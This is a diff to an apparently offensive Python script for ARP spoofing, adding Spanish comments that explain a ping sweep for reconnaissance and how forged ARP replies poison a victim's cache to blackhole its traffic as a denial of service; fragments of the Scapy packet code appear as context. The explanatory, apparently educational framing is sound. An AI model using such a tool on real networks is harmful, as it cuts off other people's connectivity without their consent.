@@ -96,6 +96,10 @@ def leer_arp_windows(mi_ip, gateway):
 
 
 def forzar_descubrimiento(mi_ip):
+    # FASE DE RECONOCIMIENTO: Ping Sweep
+    # Para que el ataque funcione, Windows necesita conocer qué dispositivos están vivos.
+    # Enviamos un "ping" a todas las posibles IPs de la subred para forzarlos a responder
+    # y así guardar sus direcciones MAC en nuestra tabla ARP local.
     partes = mi_ip.split(".")
     base = f"{partes[0]}.{partes[1]}.{partes[2]}"
     print("[*] Forzando descubrimiento de red (Ping Sweep silencioso)...")
@@ -180,6 +184,11 @@ def obtener_mac(ip, interfaz):
 
 
 def spoof(ip_objetivo, mac_objetivo, ip_suplantada, mi_mac, interfaz):
+    # VULNERABILIDAD CAPA 2: ARP Spoofing como mecanismo de DoS (Denial of Service)
+    # Al inyectar estos paquetes falsos, envenenamos la caché de la víctima.
+    # Dado que NO tenemos activado el reenvío de paquetes (IP Forwarding), 
+    # cuando la víctima nos envía su tráfico, nuestra computadora simplemente lo descarta ("Blackhole").
+    # Esto compromete directamente la 'Disponibilidad' (Availability) de la red.
     paquete = Ether(dst=mac_objetivo) / ARP(
         op    = 2,
         pdst  = ip_objetivo,
